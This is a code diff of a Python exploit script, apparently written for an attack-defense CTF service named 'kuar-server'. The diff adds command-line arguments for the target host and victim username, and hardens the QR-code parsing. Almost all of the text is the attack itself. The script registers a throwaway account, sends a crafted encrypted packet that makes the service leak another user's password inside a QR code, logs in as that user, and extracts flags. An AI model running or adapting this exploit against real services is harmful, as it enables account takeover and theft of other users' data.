@@ -7,6 +7,7 @@ from PIL import Image
 from pyzbar.pyzbar import decode
 import re
 
+import sys
 import os
 import tempfile
 
@@ -14,7 +15,7 @@ import tempfile
 
 BINARY = "./kuar-server"
 
-IP = "localhost"
+IP = 'localhost'
 PORT = 9999
 
 # SPLOIT #
@@ -110,12 +111,27 @@ class CheckMachine:
         self.send(b"3")
         data = b''
 
-        for i in range(0, 15):
-            data += self.recv(DEFAULT_RECV_SIZE)
-            if b"> " in data:
-                break
+        while True:
+            self.sock.settimeout(0.8)
+            try:
+                tmp = self.sock.recv(16)
+                #print(tmp)
+                if tmp == b'':
+                    break
 
-        data = data.split(b'\n')[:-5]
+                data += tmp
+            except:
+                break
+        
+
+        data = self.decrypt(data)
+        if len(data) == 0:
+            self.c.cquit(status, "Can't get QR-code",
+                "data is empty")
+
+        data = data.split(b'\n')[:-6]
+        #print(data)
+
         pixels = []
 
         for line in data:
@@ -127,9 +143,13 @@ class CheckMachine:
                     pixel_line.append((0, 0, 0))
             pixels.append(pixel_line)
 
-        imgSize = (len(data)-1, len(pixels[0])-1)
+        if len(pixels) < 4 or len(pixels[0]) < 4:
+            self.c.cquit(status, "Invalid QR-code format",
+                "Pixels is to small")
 
-        img = Image.new('RGB', imgSize )
+        imgSize = (len(data), len(pixels[0]))
+
+        img = Image.new('RGB', imgSize)
         img_pixels = img.load()
 
         for i in range(0, imgSize[0]):
@@ -152,44 +172,51 @@ class CheckMachine:
         self.sock.recv(DEFAULT_RECV_SIZE) # get menu
 
 
-ATTACKED_USERNAME = '4RdQHHRkRhOo'
+if __name__ == "__main__":
 
-r = remote(IP, PORT)
-cl  = CheckMachine(r)
-username = os.urandom(3).hex()
-password = os.urandom(3).hex()
+    if len(sys.argv) > 2:
+        IP = sys.argv[1]
+        ATTACKED_USERNAME = sys.argv[2]
+    else:
+        print("[-] Usage: ./remote_sploit.py <host> <username>")
+        sys.exit(0)
 
-cl.register(username, password)
-cl.sock.close()
+    r = remote(IP, PORT)
+    cl  = CheckMachine(r)
+    username = os.urandom(3).hex()
+    password = os.urandom(3).hex()
 
-r = remote(IP, PORT)
-cl  = CheckMachine(r)
+    cl.register(username, password)
+    cl.sock.close()
 
-cl.login(ATTACKED_USERNAME, 'c')
-cl.login(username, password)
+    r = remote(IP, PORT)
+    cl  = CheckMachine(r)
 
-cl.send(b"2")
-cl.recv(4096)
-packet = cl.ctx.encrypt(b'fa12bed303d0da9782ada4e1196d1ec2|d34258c28928e9c3b4a323ee9de5d338|1f5f8f170d64e1d9a5cbf89c01a503dd|c7a068a7d459ba9b953556aa47fb1abb|2129bec1689619746d3f02f54724ddf7|abd'.ljust(252-16, b'a') + b'\x80'*4)
-cl.sock.send(packet)
-cl.recv(1024)
+    cl.login(ATTACKED_USERNAME, 'c')
+    cl.login(username, password)
 
-qr_path = cl.get_qr()
+    cl.send(b"2")
+    cl.recv(4096)
+    packet = cl.ctx.encrypt(b'fa12bed303d0da9782ada4e1196d1ec2|d34258c28928e9c3b4a323ee9de5d338|1f5f8f170d64e1d9a5cbf89c01a503dd|c7a068a7d459ba9b953556aa47fb1abb|2129bec1689619746d3f02f54724ddf7|abd'.ljust(252-16, b'a') + b'\x80'*4)
+    cl.sock.send(packet)
+    cl.recv(1024)
 
-decodeQr = process(["zbarimg", qr_path]).recvall()
+    qr_path = cl.get_qr()
 
-qr_start = decodeQr.index(b'QR-Code:')
-if qr_start == -1:
-    print("err")
-    sys.exit(0)
+    decodeQr = process(["zbarimg", qr_path]).recvall()
 
-ATTACKED_USER_PASSWORD = decodeQr[qr_start+8:][0x124:0x124+24].decode()
-cl.sock.close()
+    qr_start = decodeQr.index(b'QR-Code:')
+    if qr_start == -1:
+        print("err")
+        sys.exit(0)
 
-r = remote(IP, PORT)
-cl  = CheckMachine(r)
-cl.login(ATTACKED_USERNAME, ATTACKED_USER_PASSWORD)
-qr_path = cl.get_qr()
-decodeQr = process(["zbarimg", qr_path]).recvall().decode()
-print(re.findall(r"[0-9A-Z]{31}=", decodeQr))
-cl.sock.close()
+    ATTACKED_USER_PASSWORD = decodeQr[qr_start+8:][0x124:0x124+24].decode()
+    cl.sock.close()
+
+    r = remote(IP, PORT)
+    cl  = CheckMachine(r)
+    cl.login(ATTACKED_USERNAME, ATTACKED_USER_PASSWORD)
+    qr_path = cl.get_qr()
+    decodeQr = process(["zbarimg", qr_path]).recvall().decode()
+    print(re.findall(r"[0-9A-Z]{31}=", decodeQr))
+    cl.sock.close()
